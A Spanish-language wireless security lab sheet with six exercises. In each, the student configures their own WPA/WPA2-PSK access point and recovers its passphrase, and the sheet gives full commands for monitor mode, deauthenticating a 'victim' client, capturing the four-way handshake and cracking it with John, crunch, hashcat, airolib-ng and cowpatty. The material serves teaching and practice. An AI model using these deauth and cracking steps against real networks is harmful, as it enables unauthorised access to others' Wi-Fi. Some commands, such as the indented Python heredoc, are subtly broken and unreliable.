# Ejercicios

### A

Configure su punto de acceso con cifrado WPA/WPA2 PSK y añada dos o tres dígitos al final de una frase de contraseña de /usr/share/john/password.lst. Reconfigure el cliente víctima para que se conecte al punto de acceso.

1. Ponga su tarjeta inalámbrica en modo monitor e inicie una captura con airodump-ng.
2. Desautentique al cliente víctima y asegúrese de haber capturado el protocolo de enlace WPA de 4 vías.
3. Descifre la frase de contraseña WPA usando John the Ripper en combinación con aircrack-ng.

### B

Configure su punto de acceso con cifrado WPA/WPA2 PSK y la contraseña "password" seguida de tres dígitos. Reconfigure el cliente víctima para que se conecte al punto de acceso.

1. Ponga su tarjeta inalámbrica en modo monitor e inicie una captura con airodump-ng.
2. Desautentique al cliente víctima y asegúrese de haber capturado el protocolo de enlace WPA de 4 vías.
3. Descifre la contraseña WPA usando Crunch en combinación con aircrack-ng.

### C 

Configure su punto de acceso con cifrado WPA/WPA2 PSK y una frase de contraseña que contenga las palabras "bird", "cat" y "dog" en cualquier orden, seguidas de dos o tres dígitos, como se muestra en esta sección. Reconfigure el cliente víctima para que se conecte al punto de acceso.

1. Ponga su tarjeta inalámbrica en modo monitor e inicie una captura con airodump-ng.
2. Desautentique al cliente víctima y asegúrese de haber capturado el protocolo de enlace WPA de 4 vías.
3. Descifre la frase de contraseña WPA utilizando RSMangler en combinación con aircrack-ng.

### D

Configure su punto de acceso con cifrado WPA/WPA2 PSK y use una contraseña de /usr/share/john/password.lst. Reconfigure el cliente víctima para que se conecte al punto de acceso.

1. Coloque su tarjeta inalámbrica en modo monitor e inicie una captura con airodump-ng.
2. Desautentique al cliente víctima y asegúrese de haber capturado el protocolo de enlace WPA de 4 vías.
3. Convierta el protocolo de enlace de 4 vías a HCCAPx. 
4. Descifrar la contraseña WPA usando hashcat.

### E

Configure su punto de acceso con cifrado WPA/WPA2 PSK y use una frase de contraseña de /usr/share/john/password.lst. Reconfigure el cliente víctima para que se conecte al punto de acceso.

1. Coloque su tarjeta inalámbrica en modo monitor e inicie una captura con airodump-ng.
2. Desautentique al cliente víctima y asegúrese de haber capturado el protocolo de enlace (handshake) WPA de 4 vías.
3. Con airolib-ng, cree una base de datos que contenga el ESSID de su punto de acceso e importe la lista de contraseñas de John, /usr/share/john/password.lst.
4. Con airolib-ng, procese por lotes las combinaciones de claves PMK.
5. Utilice aircrack-ng, junto con la base de datos de airolib-ng, para descifrar el protocolo de enlace WPA en su archivo de captura.

### F

Configure su punto de acceso con cifrado WPA/WPA2 PSK y use una contraseña de /usr/share/john/password.lst. Reconfigure el cliente víctima para que se conecte al punto de acceso.

1. Ponga su tarjeta inalámbrica en modo monitor e inicie una captura con airodump-ng.
2. Desautentique al cliente víctima y asegúrese de haber capturado el protocolo de enlace WPA de 4 vías.
3. Ejecute coWPAtty en modo lista de palabras contra su archivo de captura para recuperar la clave WPA.
4. Genere un conjunto de hashes para su AP y use el archivo resultante con coWPAtty para ver la diferencia de velocidad al usar tablas arcoíris.

### Instrucciones y comandos útiles (resumen práctico)

Notas previas:
- Reemplace wlan0 por su interfaz y wlan0mon por la interfaz en modo monitor que crea.
- Reemplace <BSSID>, <CH>, <CLIENT>, <ESSID> y nombres de archivos por sus valores reales.
- Abra varias terminales: una para monitor/airodump, otra para aireplay, otra para herramientas de cracking.

### A — WPA + frase de /usr/share/john/password.lst + 2–3 dígitos (John + aircrack)
1. Preparar interfaz:
```bash
airmon-ng check kill
airmon-ng start wlan0         # crea wlan0mon
```
2. Capturar handshake:
```bash
airodump-ng --bssid <BSSID> --channel <CH> -w /tmp/capture wlan0mon
aireplay-ng --deauth 8 -a <BSSID> -c <CLIENT> wlan0mon
```
- Verificar “WPA handshake” en la cabecera de airodump-ng

- Convertir captura para John y crackear:
```bash   
wpapcap2john /tmp/capture-01.cap > /tmp/wpa.hash
john --wordlist=/usr/share/john/password.lst /tmp/wpa.hash
```
- Verificar (si John muestra la contraseña):
```bash
aircrack-ng -w <(echo "CONTRASEÑA_DETECTADA") -b <BSSID> /tmp/capture-01.cap
```

### B — WPA = "password" + 3 dígitos (Crunch + aircrack)
- Capturar handshake como en A.
- Generar wordlist con crunch (prefijo "password" + 3 dígitos):
```bash
crunch 3 3 0123456789 | sed 's/^/password/' > /tmp/passlist.txt
```
- Cracking con aircrack-ng:
```bash    
aircrack-ng -w /tmp/passlist.txt -b <BSSID> /tmp/capture-01.cap
```

### C — Frase que contiene bird, cat, dog en cualquier orden + 2–3 dígitos (generar combinaciones)
- Capturar handshake como en A.
- Generar todas las permutaciones con python:
    ```bash
    python3 - <<'PY'
        from itertools import permutations, product
        words = ["bird","cat","dog"]
        with open("/tmp/mangled.txt","w") as f:
                for r in (2,3):
                        for perm in permutations(words, 3):
                                for nums in product("0123456789", repeat=r):
                                        f.write("".join(perm) + "".join(nums) + "\n")
        PY
    ```
- Cracking con aircrack:
```bash
aircrack-ng -w /tmp/mangled.txt -b <BSSID> /tmp/capture-01.cap
```

### D — Convertir handshake a HCCAPx y usar hashcat
- Capturar handshake como en A.
- Convertir captura a hccapx:
```bash
hcxpcaptool -z /tmp/capture.hccapx /tmp/capture-01.cap      # (hcxtools)
```
> o (alternativa) 
```bash
cap2hccapx /tmp/capture-01.cap /tmp/capture.hccapx
```
- Cracking con hashcat (modo 2500 para hccapx):
```bash
hashcat -m 2500 /tmp/capture.hccapx /usr/share/john/password.lst -O -w 3
```
- Para usar semillas pequeñas o benchmark: 
```bash
hashcat --show /tmp/capture.hccapx
```
> Guarda con esto.. hccapx 2500 esta deprecado utilizar .22000
```bash
hcxpcapngtool -o capture.hc22000 capture-01.cap
```

- Resultado: hashcat mostrará la contraseña si está en la lista.

### E — airolib-ng: crear DB, importar ESSID + lista de contraseñas, precomputar PMKs, usar con aircrack-ng
- Crear archivos base:
```bash
echo "<ESSID>" > /tmp/essid.txt
```
- Crear base airolib y cargar ESSID + contraseñas:
```bash
airolib-ng /tmp/airolib.db --import essid /tmp/essid.txt
airolib-ng /tmp/airolib.db --import password /usr/share/john/password.lst
```
- Precomputar PMKs (batch):
```bash
airolib-ng /tmp/airolib.db --batch --compute
```
- Usar la DB para acelerar cracking:
    - Algunos flujos: aircrack-ng puede aprovechar la DB con la opción --pmkid/--wpapsk según versión; si su versión lo requiere, consulte `man airolib-ng` y `man aircrack-ng` para la sintaxis exacta de integración. (Si airolib-ng no está disponible, utilice el flujo D con hcxpcaptool + hashcat).

### F — coWPAtty: modo lista y tablas arcoíris (comparación de velocidad)
- Capturar handshake y convertir a formato soportado por cowpatty (hccap):
```bash
hcxpcaptool -z /tmp/capture.hccapx /tmp/capture-01.cap
```
    - cap2hccapx puede producir .hccapx; cowpatty acepta .hccap (use herramientas adjuntas para convertir si es necesario).
- Cracking con cowpatty (modo lista de palabras):

```bash
cowpatty -r /tmp/capture.hccapx -f /usr/share/john/password.lst -s "<ESSID>"
```
- Generar tabla de PMKs (genpmk) y usar con cowpatty:
```bash
genpmk -i /usr/share/john/password.lst -s "<ESSID>" -o /tmp/pmk.db
```
    - cowpatty puede usar la base precomputada para acelerar la búsqueda; consulte `man genpmk` y `man cowpatty` para la sintaxis exacta. Compare tiempos de cowpatty con y sin PMK precalculadas para medir mejora.
    - Para tablas arcoíris externas, importe/prepare según la herramienta de tablas que esté usando y mida la diferencia con tiempo de ejecución.

Comprobaciones y comentarios finales
- Verificación rápida del handshake: airodump-ng muestra “WPA handshake: <BSSID>” en la parte superior cuando se capturó correctamente.
- Si no aparece handshake: intentar más deauth o conectar/desconectar el cliente víctima.
- Para pruebas locales sin cliente real: usar un AP virtual (hostapd) y un cliente controlado para reproducir el handshake.
- Instale herramientas necesarias si faltan: aircrack-ng, john, crunch, hashcat, hcxtools (hcxpcaptool), cowpatty, python3.
